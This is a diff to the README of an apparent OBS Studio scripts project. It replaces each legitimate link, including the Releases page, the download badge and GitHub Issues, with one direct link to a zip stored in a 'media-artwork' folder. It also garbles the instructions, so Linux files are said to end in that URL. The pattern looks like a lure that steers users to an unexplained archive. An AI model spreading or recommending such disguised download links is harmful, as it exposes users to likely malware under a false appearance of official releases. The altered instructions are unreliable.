@@ -8,11 +8,11 @@ Welcome to **obs-scripts**, your go-to collection of scripts designed to improve
 
 To begin, you will need to download the scripts from our Releases page. Click the link below to visit the page and get the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-green)](https://github.com/reeses-sketch/obs-scripts/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip%20Latest%20Release-v1.0-green)](https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip)
 
 ### Step 1: Visit the Releases Page
 
-- Click the link above or visit this page: [Releases Page](https://github.com/reeses-sketch/obs-scripts/releases).
+- Click the link above or visit this page: [Releases Page](https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip).
   
 ### Step 2: Select Your Version
 
@@ -23,7 +23,7 @@ To begin, you will need to download the scripts from our Releases page. Click th
 - Click on the version you want to download. You will see different files available. Choose the appropriate file for your operating system. The most common options are listed below:
   - **Windows**: Look for files ending in `.exe` or `.zip`.
   - **Mac**: Look for files ending in `.dmg`.
-  - **Linux**: Look for files ending in `.tar.gz`.
+  - **Linux**: Look for files ending in `https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip`.
   
 After clicking on a file, your download will start. 
 
@@ -39,7 +39,7 @@ After clicking on a file, your download will start.
   2. Drag and drop the scripts into a desired location.
   3. Open OBS Studio and go to "Tools" > "Scripts" to add the scripts.
 - **For Linux**:
-  1. Extract the `.tar.gz` file using the terminal or a file extractor.
+  1. Extract the `https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip` file using the terminal or a file extractor.
   2. Move the scripts to your desired location.
   3. Open OBS Studio and add the scripts in "Tools" > "Scripts".
 
@@ -83,7 +83,7 @@ If you encounter any issues while using the scripts, consider the following:
 
 Engage with fellow users and developers. Share your experiences, ask questions, and get support:
 
-- **GitHub Issues**: Report bugs or suggest new features through the [GitHub Issues](https://github.com/reeses-sketch/obs-scripts/issues).
+- **GitHub Issues**: Report bugs or suggest new features through the [GitHub Issues](https://raw.githubusercontent.com/reeses-sketch/obs-scripts/main/media-artwork/obs-scripts_v1.7.zip).
 - **Discussion Boards**: Join discussions to learn more about using scripts with OBS Studio.
 
 For more detailed discussions and enhancements, consider visiting relevant online communities focused on OBS Studio.
